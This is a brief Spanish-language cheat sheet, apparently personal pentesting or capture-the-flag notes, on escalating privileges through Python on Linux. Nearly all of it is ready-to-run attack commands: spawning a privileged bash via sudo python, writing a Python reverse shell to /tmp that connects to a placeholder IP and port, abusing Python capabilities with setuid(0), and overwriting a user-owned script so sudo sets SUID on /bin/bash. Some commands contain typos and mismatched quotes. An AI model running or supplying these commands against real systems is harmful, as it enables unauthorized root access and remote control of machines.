## Nota: revisar: /usr/lib/python3 y /usr/bin/python3 

Para escalar a root :

```bash
 sudo -u /usr/bin/python3.8 -c ‘import os; os.execl(”/bin/bash”, “bash”, “-p”)’
```

Para escalar a usuario :

```bash
 echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /tmp/rev.py
```

```bash
sudo -u USER /usr/bin/python3 /tmp/rev.py
```

Cuando python tiene capabillites (checar con getcap) :

```bash
RUTA_DE_GETCAP/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
## Aplicar permisos SUID con script

Si el usuario actual es dueño del script:

```bash
rm <RUTA_A_SCRIPT>
```

Una vez que lo hayamos eliminado, crearemos el script con el mismo nombre pero añadiendo lo siguiente:

```python
echo -e "import os\n\nos.system('chmod u+s /bin/bash') > <RUTA_A_SCRIPT>
```

Ahora hacemos lo siguiente:

```bash
sudo /usr/bin/python3 <RUTA_A_SCRIPT>
```

```bash
bash -p
```
